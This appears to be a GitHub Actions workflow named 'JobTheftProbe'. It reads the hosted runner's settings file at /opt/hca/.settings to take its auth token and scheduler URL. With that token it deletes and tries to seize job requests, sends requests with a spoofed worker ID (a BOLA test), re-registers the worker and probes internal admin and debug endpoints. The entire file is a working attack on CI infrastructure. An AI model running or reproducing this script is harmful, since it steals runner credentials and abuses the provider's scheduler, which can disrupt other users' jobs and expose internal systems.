name: JobTheftProbe
on:
  push:
    branches: [main]
permissions:
  contents: read
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - name: Job theft attempt DELETE+GET sequence
        run: |
          SETTINGS=$(cat /opt/hca/.settings)
          AUTH=$(echo $SETTINGS | python3 -c "import json,sys; print(json.load(sys.stdin).get('authToken',''))")
          SCHED=$(echo $SETTINGS | python3 -c "import json,sys; print(json.load(sys.stdin).get('schedulerApiUrl',''))")
          echo '=== STEP 1: Get current request state BEFORE delete ==='
          curl -s -w '\nHTTP:%{http_code}' -X GET -H "Authorization: Bearer $AUTH" "${SCHED}/request" 2>/dev/null | head -c 2000
          echo ''
          echo '=== STEP 2: DELETE current job request ==='
          DEL=$(curl -s -w '\nHTTP:%{http_code}' -X DELETE -H "Authorization: Bearer $AUTH" "${SCHED}/request" 2>/dev/null)
          echo DELETE_RESPONSE=$DEL
          echo ''
          echo '=== STEP 3: GET /v1/request AFTER delete (do we get another job?) ==='
          sleep 1
          curl -s -w '\nHTTP:%{http_code}' -X GET -H "Authorization: Bearer $AUTH" "${SCHED}/request" 2>/dev/null | head -c 2000
          echo ''
          echo '=== STEP 4: POST /v1/worker with modified body (BOLA test) ==='
          curl -s -w '\nHTTP:%{http_code}' -X POST \
            -H "Authorization: Bearer $AUTH" \
            -H 'Content-Type: application/json' \
            -d '{"workerId": "00000000-0000-0000-0000-000000000001", "poolId": "azure-eastus-general"}' \
            "${SCHED}/worker" 2>/dev/null | head -c 1000
          echo ''
          echo '=== STEP 5: Try PUT /v1/request (take a job) ==='
          curl -s -w '\nHTTP:%{http_code}' -X PUT \
            -H "Authorization: Bearer $AUTH" \
            -H 'Content-Type: application/json' \
            -d '{}' \
            "${SCHED}/request" 2>/dev/null | head -c 2000
          echo ''
          echo '=== STEP 6: Re-register worker after delete ==='
          curl -s -w '\nHTTP:%{http_code}' -X POST \
            -H "Authorization: Bearer $AUTH" \
            -H 'Content-Type: application/json' \
            -d '{"capabilities": {"os": "linux", "arch": "x64"}}' \
            "${SCHED}/worker" 2>/dev/null | head -c 1000
          echo ''
          echo '=== STEP 7: Get job after re-register ==='
          curl -s -w '\nHTTP:%{http_code}' -X GET -H "Authorization: Bearer $AUTH" "${SCHED}/request" 2>/dev/null | head -c 2000
          echo ''
          echo '=== INTERNAL API ENDPOINTS DISCOVERY ==='
          for path in '' /v1/admin /v1/debug /v1/metrics /v1/stats /v1/config /v1/version /v1/status /v1/runners /v1/allocations /v1/capacity; do
            STATUS=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $AUTH" "${SCHED}${path}" 2>/dev/null)
            echo PATH=$path STATUS=$STATUS
          done
